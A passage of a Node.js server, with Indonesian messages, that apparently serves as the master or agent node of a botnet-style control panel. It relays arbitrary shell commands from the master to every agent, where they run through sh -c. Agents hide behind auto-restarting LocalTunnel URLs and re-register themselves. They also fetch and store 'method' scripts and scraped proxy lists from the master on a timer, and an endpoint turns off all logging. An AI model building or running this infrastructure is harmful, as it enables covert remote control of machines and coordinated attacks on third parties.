  if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir, { recursive: true });

  let moved = false;
  if (allowedExt.includes(ext)) {
    const destPath = path.join(uploadDir, req.file.originalname);
    fs.renameSync(req.file.path, destPath);
    moved = true;
    logActivity("RECEIVE_UPDATE_MOVE", { file: req.file.originalname, size: req.file.size });
  } else {
    moved = false;
    logActivity("RECEIVE_UPDATE_OTHER", { file: req.file.originalname, size: req.file.size });
  }

  let syncResult = null;
  if (NODE_TYPE === 'agent') {
    try {
      const { data } = await axios.get(`${MASTER_URL}/api/methods`, {
        params: { key: AGENT_KEY }, timeout: 30000
      });
      writeMethods(data);
      syncResult = { success: true, source: MASTER_URL, methodsCount: Object.keys(data).length };
      logActivity("AUTO_SYNC_METHODS_JSON", { from: MASTER_URL, size: Object.keys(data).length });
    } catch (err) {
      syncResult = { success: false, error: err.message, source: MASTER_URL };
      logActivity("AUTO_SYNC_METHODS_JSON_FAIL", { from: MASTER_URL, error: err.message });
    }
  }
  res.json({
    message: 'File update diterima',
    file: req.file.originalname,
    moved,
    mode: NODE_TYPE,
    sync: syncResult
  });
});

app.post('/api/agent/update', validateApiKey, upload.single('file'), async (req, res) => {
  const key = req.query.key || req.body.key;
  if (!req.file) return res.status(400).send('Tidak ada file ter-upload');
  loadAgents();
  const results = await Promise.all(AGENT_LIST.map(agent => {
    const form = new FormData();
    form.append('key', AGENT_KEY);
    form.append('file', fs.createReadStream(req.file.path), req.file.originalname);
    return axios.post(`${agent.url}/api/update`, form, { headers: form.getHeaders(), timeout: 30000 })
      .then(resp => ({ agent: agent, status: 'success', data: resp.data }))
      .catch(e => ({ agent: agent, status: 'failed', error: e.message }));
  }));

  logActivity("PUSH_UPDATE", { file: req.file.filename, results });
  broadcastWS({ type: "agent_update", results, file: req.file.filename });
  res.json({ message: 'Update didistribusikan', results });
});

app.get('/proxy.txt', (req, res) => {
  const proxyPath = path.join(__dirname, 'proxy.txt');
  if (!fs.existsSync(proxyPath)) return res.status(404).send('proxy.txt not found');
  res.type('text/plain').send(fs.readFileSync(proxyPath, 'utf8'));
});

app.post('/api/shell', validateApiKey, express.json(), async (req, res) => {
  const { command } = req.body;

  if (!command || typeof command !== 'string') {
    return res.status(400).json({ error: 'Command tidak valid' });
  }
  if (isForbiddenShell(command)) {
    return res.status(403).json({ error: `Command terlarang.` });
  }

  // === AGENT MODE ===
  if (NODE_TYPE === 'agent') {
    const proc = spawn('sh', ['-c', command]);
    let output = '', error = '';

    proc.stdout.on('data', data => output += data.toString());
    proc.stderr.on('data', data => error += data.toString());

    proc.on('close', code => {
      if (code === 0) {
        return res.json({ output });
      } else {
        return res.status(500).json({ error: `Code ${code}: ${error || output}` });
      }
    });
    return;
  }

  // === MASTER MODE ===
  if (NODE_TYPE === 'master') {
    try {
      loadAgents();
      const results = await Promise.all(AGENT_LIST.map(agent =>
        axios.post(`${agent.url}/api/shell`, {
          key: AGENT_KEY,
          command
        }, { timeout: 10000 })
          .then(r => ({ agent: agent.name, status: 'success', output: r.data.output }))
          .catch(e => ({ agent: agent.name, status: 'failed', error: e.message }))
      ));

      return res.json({ results });
    } catch (e) {
  console.error('Error:', e);
}
  }
  return res.status(400).json({ error: 'NODE_TYPE tidak dikenal' });
});

app.post('/api/toggle-log', disableIfAgent(), validateApiKey, (req, res) => {
  const mode = req.query.mode;

  if (mode === 'off') {
    global.DISABLE_LOG = true;
    return res.json({ message: '✅ Semua log dimatikan' });
  }
  if (mode === 'on') {
    global.DISABLE_LOG = false;
    return res.json({ message: '✅ Logging diaktifkan kembali' });
  }
  res.status(400).json({ error: 'Parameter "mode" harus "on" atau "off"' });
});
app.get('/api/log-status', validateApiKey, (req, res) => {
  res.json({ logging: global.DISABLE_LOG ? 'disabled' : 'enabled' });
});

//=============== ROUTE 404 ===========
app.use((req, res) => {
  const notFoundFile = path.join(__dirname, 'web', '404.html');
  if (fs.existsSync(notFoundFile)) {
    res.status(404).sendFile(notFoundFile);
  } else {
    res.status(404).send('404 Not Found');
  }
});
// ======================= OTOMATISASI AGENT DAN SYNC =======================
async function scrapeProxy({ protocols = ['http', 'https', 'socks4', 'socks5'], country = 'ALL' }) {
  const results = [];
  const stats = { total: 0, byProto: {} };

  for (const src of SCRAPE_SOURCES) {
    if (!protocols.includes(src.proto) && src.proto !== 'mix') continue;
    try {
      const { data } = await axios.get(src.url, { timeout: 30000 });
      const proxies = data.split('\n')
        .map(line => parseProxyLine(line))
        .filter(p => !!p);

      for (const p of proxies) {
        results.push(p);
      }

      stats.total += proxies.length;
      stats.byProto[src.proto] = (stats.byProto[src.proto] || 0) + proxies.length;
    } catch (err) {
      logActivity("SCRAPE_SOURCE_FAILED", { url: src.url, error: err.message });
    }
  }
  return { proxies: results, stats };
}

async function getPublicIp() {
  try {
    const { data } = await axios.get('https://api.ipify.org?format=json', { timeout: 5000 });
    return data.ip;
  } catch (e) {
    logActivity("GET_PUBLIC_IP_FAIL", { error: e.message });
    return 'localhost';
  }
}

async function autoRegisterToMaster() {
  if (NODE_TYPE !== 'agent') return;

  let agentUrl = localTunnelUrl;
  if (!agentUrl) {
    const publicIp = await getPublicIp();
    agentUrl = `http://${publicIp}:${port}`;
  }

  let agentName = '';
  let needRegister = true;

  try {
    const { data: agents } = await axios.get(`${MASTER_URL}/api/agents`, {
      params: { key: AGENT_KEY },
      timeout: 30000
    });

    const existing = agents.find(a => a.fingerprint === AGENT_FINGERPRINT);
    if (existing) {
      agentName = existing.name;

      if (existing.url !== agentUrl) {
        await axios.put(`${MASTER_URL}/api/agents/${agentName}`, {
          key: AGENT_KEY,
          url: agentUrl
        }, { timeout: 30000 });

        logActivity("AGENT_URL_AUTO_UPDATED", { agentName, oldUrl: existing.url, newUrl: agentUrl });
      }

      needRegister = false;
    } else {
      const usedNames = new Set(agents.map(a => a.name));
      let n = 1;
      while (usedNames.has(`srv${n}`)) n++;
      agentName = `srv${n}`;
      needRegister = true;
    }
  } catch (e) {
    logActivity("AUTO_REGISTER_FETCH_FAIL", { error: e.message });
    agentName = LAST_REGISTERED.name || `srv${Math.floor(Math.random() * 10000)}`;
    needRegister = true;
  }

  if (needRegister) {
    try {
      const { data } = await axios.post(`${MASTER_URL}/api/agents/register`, {
        name: agentName,
        url: agentUrl,
        agentKey: AGENT_KEY,
        fingerprint: AGENT_FINGERPRINT
      }, { timeout: 30000 });

      logActivity("AUTO_REGISTER_MASTER", { result: data, agentName, agentUrl });
      LAST_REGISTERED = { name: agentName, url: agentUrl };
    } catch (e) {
      logActivity("AUTO_REGISTER_MASTER_FAIL", { error: e.message, agentName, agentUrl });
    }
  }
}

async function startLocalTunnel(retryCount = 10) {
  let tunnel = null;
  for (let i = 1; i <= retryCount; i++) {
    try {
      tunnel = await localtunnel({ port });
      if (tunnel.url) {
        localTunnelUrl = tunnel.url;
        console.log('\x1b[32m%s\x1b[0m', 'Agent URL via LocalTunnel:', tunnel.url);

        tunnel.on('close', async () => {
          console.log('\x1b[31m%s\x1b[0m', '[AGENT] Tunnel closed. Attempting to restart...');
          logActivity("TUNNEL_CLOSED_AUTO", { previousUrl: localTunnelUrl });

          localTunnelUrl = null;
          currentTunnel = null;

          await new Promise(r => setTimeout(r, 1500));
          await restartTunnel();
        });

        return tunnel;
      } else {
        throw new Error('LocalTunnel tidak mengembalikan URL');
      }
    } catch (err) {
      console.error(`LocalTunnel failed (attempt ${i}):`, err.message);
      if (i === retryCount) {
        console.error('\x1b[31m%s\x1b[0m', 'Gagal konek LocalTunnel setelah beberapa percobaan. Server tetap berjalan.');
      } else {
        await new Promise(r => setTimeout(r, 30000));
      }
    }
  }
  return null;
}
// ======================= TAMBAHAN UNTUK HANDLE 503 LOCAL TUNNEL AGENT =======
async function restartTunnel() {
  try {
    if (currentTunnel && typeof currentTunnel.close === 'function') {
      try {
        await currentTunnel.close();
      } catch (closeErr) {
        console.warn('[AGENT] Gagal close tunnel sebelumnya:', closeErr.message);
        logActivity("TUNNEL_CLOSE_FAIL", { error: closeErr.message });
      }
    }

    currentTunnel = null;
    localTunnelUrl = null;

    await new Promise(r => setTimeout(r, 15000));

    currentTunnel = await startLocalTunnel(10);

    if (!currentTunnel || !currentTunnel.url) {
      console.error('[AGENT] Gagal membuat tunnel baru. Skip dan tunggu percobaan selanjutnya.');
      logActivity("TUNNEL_RESTART_SKIP", { reason: "No tunnel URL after retries" });
      return;
    }

    await autoRegisterToMaster();
    logActivity("TUNNEL_RESTART_SUCCESS", { newUrl: currentTunnel.url });
    console.log('[AGENT] Tunnel restarted and registered to master.');
  } catch (err) {
    logActivity("TUNNEL_RESTART_FAIL", { error: err.message });
    console.error('[AGENT] Gagal restart tunnel:', err.message);
  }
}
setInterval(async () => {
  if (NODE_TYPE !== 'agent') return;
  if (currentTunnel || localTunnelUrl) return;

  console.log('[AGENT] Tunnel mati, mencoba recovery...');
  try {
    currentTunnel = await startLocalTunnel(10);
    if (currentTunnel && currentTunnel.url) {
      console.log('[AGENT] Tunnel berhasil dibuat ulang:', currentTunnel.url);
      await autoRegisterToMaster();
      logActivity("TUNNEL_RECOVERY_SUCCESS", { newUrl: currentTunnel.url });
    } else {
      logActivity("TUNNEL_RECOVERY_FAILED", { reason: 'null url' });
    }
  } catch (err) {
    console.error('[AGENT] Gagal recovery tunnel:', err.message);
    logActivity("TUNNEL_RECOVERY_EXCEPTION", { error: err.message });
  }
}, 30_000);

async function checkTunnelHealth() {
  if (!localTunnelUrl) return;
  try {
    const resp = await axios.get(localTunnelUrl, { timeout: 30000, validateStatus: () => true });
    if (resp.status === 503) {
      console.log('\x1b[31m%s\x1b[0m', '[AGENT] Tunnel error 503 detected! Restarting tunnel...');
      logActivity("TUNNEL_503_DETECTED", { url: localTunnelUrl });
      await restartTunnel();
    }
  } catch (err) {
    if (err.response && err.response.status === 503) {
      console.log('\x1b[31m%s\x1b[0m', '[AGENT] Tunnel error 503 detected (err.response)! Restarting tunnel...');
      logActivity("TUNNEL_503_DETECTED", { url: localTunnelUrl });
      await restartTunnel();
    }
  }
}

async function autoSyncFromMaster() {
  if (NODE_TYPE !== 'agent') return;
  try {
    const { data: methodsData } = await axios.get(`${MASTER_URL}/api/methods`, {
      params: { key: AGENT_KEY }, timeout: 30000
    });
    writeFileJsonSafe(methodsPath, methodsData);
    logActivity("AUTO_SYNC_METHODS_JSON", { from: MASTER_URL, size: Object.keys(methodsData).length });
    const shouldHaveFiles = new Set(
      Object.values(methodsData)
        .map(m => m.script)
        .filter(Boolean)
    );
    if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir, { recursive: true });
    const localFiles = fs.readdirSync(uploadDir).filter(f => f.endsWith('.js') || f.endsWith('.sh'));
    for (const file of localFiles) {
      if (!shouldHaveFiles.has(file)) {
        try {
          fs.unlinkSync(path.join(uploadDir, file));
          logActivity("AUTO_MIRROR_REMOVE_FILE", { file });
        } catch (e) {
          logActivity("AUTO_MIRROR_REMOVE_FAIL", { file, error: e.message });
        }
      }
    }
    for (const scriptName of shouldHaveFiles) {
      const localPath = path.join(uploadDir, scriptName);
      if (!fs.existsSync(localPath)) {
        try {
          const url = `${MASTER_URL}/lib/method/${encodeURIComponent(scriptName)}`;
          const resp = await axios.get(url, { responseType: 'stream', timeout: 30000 });
          const writer = fs.createWriteStream(localPath);
          await new Promise((resolve, reject) => {
            resp.data.pipe(writer);
            writer.on('finish', resolve);
            writer.on('error', reject);
          });
          logActivity("AUTO_SYNC_METHOD_FILE", { scriptName });
        } catch (err) {
          logActivity("AUTO_SYNC_METHOD_FILE_FAIL", { scriptName, error: err.message });
        }
      }
    }
    try {
      const proxyUrl = `${MASTER_URL}/proxy.txt`;
      const localProxyPath = path.join(__dirname, 'proxy.txt');
      const resp = await axios.get(proxyUrl, { responseType: 'stream', timeout: 30000 });
      const writer = fs.createWriteStream(localProxyPath);
      await new Promise((resolve, reject) => {
        resp.data.pipe(writer);
        writer.on('finish', resolve);
        writer.on('error', reject);
      });
      logActivity("AUTO_SYNC_PROXY_TXT", { from: MASTER_URL });
    } catch (err) {
      logActivity("AUTO_SYNC_PROXY_TXT_FAIL", { from: MASTER_URL, error: err.message });
    }
  } catch (err) {
    logActivity("AUTO_SYNC_METHODS_JSON_FAIL", { from: MASTER_URL, error: err.message });
  }
}

if (NODE_TYPE === 'agent') {
  (async function initAgent() {
    currentTunnel = await startLocalTunnel(10);
    await autoRegisterToMaster();
    setInterval(autoRegisterToMaster, 5 * 60 * 1000);
    autoSyncFromMaster();
    setInterval(autoSyncFromMaster, 2 * 60 * 1000);
    let lastUrl = null;
    setInterval(() => {
      if (localTunnelUrl && localTunnelUrl !== lastUrl) {
        logActivity("TUNNEL_URL_CHANGED", {
          oldUrl: lastUrl,
          newUrl: localTunnelUrl
        });
        lastUrl = localTunnelUrl;
        autoRegisterToMaster();
      }
    }, 30000);
    setInterval(checkTunnelHealth, 60_000);
  })();
}
// ==== GLOBAL ERROR HANDLER ====
process.on('uncaughtException', (err) => {
  console.error('[FATAL] Uncaught Exception:', err);
});

process.on('unhandledRejection', (reason, promise) => {
  console.error('[FATAL] Unhandled Rejection:', reason);
});
// ======================= ERROR HANDLER GLOBAL =======================
app.use((err, req, res, next) => {
  if (err instanceof multer.MulterError) {
    switch (err.code) {
      case 'LIMIT_FILE_SIZE':
        return res.status(413).json({ error: 'Ukuran file terlalu besar. Maks 350KB.' });
      case 'LIMIT_UNEXPECTED_FILE':
        return res.status(400).json({ error: 'Tipe file tidak diizinkan.' });
      default:
        return res.status(400).json({ error: `Upload error: ${err.message}` });
    }
  }
  if (err instanceof SyntaxError && err.status === 400 && 'body' in err) {
    return res.status(400).json({ error: 'Format JSON tidak valid.' });
  }
  if (err && err.message) {
    logActivity("CUSTOM_ERROR_HANDLER", { error: err.message });
    console.error('[Custom Error Handler]', err.stack || err);
    return res.status(400).json({ error: err.message });
  }
  if (err) {
    logActivity("UNKNOWN_ERROR_HANDLER", { error: err.stack || err });
    console.error('[Unknown Error Handler]', err.stack || err);
    return res.status(500).json({ error: 'Terjadi kesalahan server.' });
  }
  next();
});
// ======================= SERVER LISTEN =======================
(async () => {
  try {
    await fetchConfig();
    httpServer.listen(port, async () => {
      console.clear();
      let ip = 'localhost';
      try { 
        ip = execSync("curl -s ifconfig.me").toString().trim(); 
      } catch (e) {
        logActivity("IP_FETCH_FAILED", { error: e.message });
      }
      console.log(`SERVER ONLINE: http://${ip}:${port}`);
      logActivity("SERVER_START", { ip, port, nodeType: NODE_TYPE });
      
      setTimeout(loadPlugins, 1000);
    }).on('error', (err) => {
      if (err.code === 'EADDRINUSE') {
        console.error(`Port ${port} sudah digunakan!`);
        process.exit(1);
      }
    });
  } catch (err) {
    console.error('Failed to start server:', err);
    process.exit(1);
  }
})();

process.on('SIGINT', () => {
  for (const pluginName in loadedPlugins) {
    if (loadedPlugins[pluginName].cleanup) {
      try {
        loadedPlugins[pluginName].cleanup();
      } catch (e) {
        console.error(`Error cleaning up plugin ${pluginName}:`, e);
      }
    }
  }
  logActivity("SIGINT", { msg: "Menutup aplikasi..." });
});